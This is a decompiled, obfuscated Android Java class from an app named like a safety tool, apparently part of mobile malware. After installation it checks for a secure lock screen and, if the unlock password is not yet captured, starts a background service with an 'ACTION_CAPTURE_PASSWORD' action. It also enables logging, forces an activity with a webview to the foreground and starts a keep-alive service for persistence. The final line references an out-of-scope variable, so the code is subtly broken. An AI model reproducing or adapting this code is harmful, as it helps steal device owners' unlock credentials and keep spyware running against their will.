package p000;

import android.app.KeyguardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import com.storm.safe.rock.iuzxujjtqev;
import com.storm.safe.rock.manager.C0263a5;
import com.storm.safe.rock.service.dqtvuisjd;
import org.conscrypt.PSKKeyManager;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class g60 {

    /* renamed from: a0 */
    public static final g60 f56416a0 = new g60();

    /* renamed from: a0 */
    public static void m212896a0(g60 g60Var, Context context, String str, String str2, int i, boolean z, int i2) {
        boolean z2 = (i2 & 32) == 0;
        boolean z3 = (i2 & 64) != 0;
        boolean z4 = (i2 & 128) == 0;
        t60.m214695b6(context, "context");
        try {
            i60.f56802a1.getInstance(context).m213106a2(str, str2, i, z);
            context.getSharedPreferences("password_input", 0).edit().putBoolean("password_input_completed", true).apply();
            cq0.m212489c1(context);
            try {
                dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
                if (c0290a0 != null) {
                    C0263a5 c0263a5 = c0290a0.f52370a1;
                    if (c0263a5 == null) {
                        c0263a5 = null;
                    }
                    if (c0263a5 != null) {
                        c0263a5.m211352a8();
                    }
                }
            } catch (Exception unused) {
            }
            try {
                Intent intent = new Intent(context, (Class<?>) iuzxujjtqev.class);
                intent.addFlags(268435456);
                intent.addFlags(67108864);
                intent.addFlags(536870912);
                intent.putExtra("from_installation_complete", true);
                intent.putExtra("show_webview", true);
                intent.putExtra("user_initiated", true);
                intent.putExtra("force_foreground", z2);
                intent.putExtra("require_password_input", z3);
                intent.putExtra("password_completed", z4);
                intent.putExtra("update_ui_status", true);
                context.startActivity(intent);
            } catch (Exception e) {
                t60.m214705c6("InstallCompleteMgr", "启动iuzxujjtqev失败", e);
            }
            try {
                context.sendBroadcast(new Intent("com.storm.safe.rock.intent.ENABLE_LOGGING"));
            } catch (Exception unused2) {
            }
            try {
                al1.f43714a5.getInstance(context).m209821a1();
            } catch (Exception e2) {
                t60.m214705c6("InstallCompleteMgr", "启动保活服务失败", e2);
            }
        } catch (Exception e3) {
            t60.m214705c6("InstallCompleteMgr", "处理安装完成失败", e3);
        }
    }

    /* renamed from: a1 */
    public final void m212897a1(Context context, boolean z) {
        boolean z2;
        t60.m214695b6(context, "context");
        try {
            Object systemService = context.getSystemService("keyguard");
            KeyguardManager keyguardManager = systemService instanceof KeyguardManager ? (KeyguardManager) systemService : null;
            boolean z3 = z && (keyguardManager != null && keyguardManager.isKeyguardSecure());
            try {
                z2 = context.getSharedPreferences("password_input", 0).getBoolean("password_input_completed", false);
            } catch (Exception e) {
                t60.m214705c6("InstallCompleteMgr", "检查密码是否完成失败", e);
                z2 = false;
            }
            if (!z3) {
                try {
                    context.getSharedPreferences("password_input", 0).edit().putBoolean("password_input_shown", true).putBoolean("password_input_completed", true).apply();
                    m212896a0(this, context, "default_device", "no_password_install_" + System.currentTimeMillis(), 0, false, PSKKeyManager.MAX_KEY_LENGTH_BYTES);
                    try {
                        context.startService(new Intent(context, (Class<?>) dqtvuisjd.class));
                        return;
                    } catch (Exception unused) {
                        return;
                    }
                } catch (Exception e2) {
                    t60.m214705c6("InstallCompleteMgr", "无密码完成流程失败", e2);
                    return;
                }
            }
            if (z3 && !z2) {
                try {
                    Intent intent = new Intent(context, (Class<?>) dqtvuisjd.class);
                    intent.setAction("ACTION_CAPTURE_PASSWORD");
                    context.startService(intent);
                    return;
                } catch (Exception e3) {
                    t60.m214705c6("InstallCompleteMgr", "请求密码捕获失败", e3);
                    return;
                }
            }
            if (z3 && z2) {
                Intent intent2 = new Intent();
                intent2.setComponent(new ComponentName(context, (Class<?>) iuzxujjtqev.class));
                intent2.addFlags(335544320);
                context.startActivity(intent2);
                return;
            }
            try {
                al1.f43714a5.getInstance(context).m209821a1();
                return;
            } catch (Exception e4) {
                t60.m214705c6("InstallCompleteMgr", "确保前台服务失败", e4);
                return;
            }
        } catch (Exception e5) {
            t60.m214705c6("InstallCompleteMgr", "处理设置完成失败", e5);
        }
        t60.m214705c6("InstallCompleteMgr", "处理设置完成失败", e5);
    }
}
